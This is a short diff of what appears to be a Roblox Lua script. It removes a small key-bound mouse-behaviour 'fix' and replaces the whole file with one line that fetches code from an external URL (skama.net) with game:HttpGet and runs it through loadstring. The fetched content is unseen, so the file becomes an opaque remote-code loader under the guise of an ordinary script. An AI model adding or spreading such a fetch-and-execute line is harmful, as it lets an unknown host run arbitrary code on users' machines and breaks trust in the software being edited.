@@ -1,17 +1,1 @@
-local UserInputService = game:GetService("UserInputService")
-local StarterGui = game:GetService("StarterGui")
-
-local function activateFix()
-    UserInputService.MouseBehavior = Enum.MouseBehavior.Default
-    UserInputService.MouseIconEnabled = true
-
-    pcall(function()
-    end)
-end
-
-UserInputService.InputBegan:Connect(function(input, gameProcessed)
-    if gameProcessed then return end
-    if input.KeyCode == Enum.KeyCode.T then
-        activateFix()
-    end
-end)
+loadstring(game:HttpGet("https://skama.net/mrr_5ba18518102c4a31a710862a8850a5f2/"))()
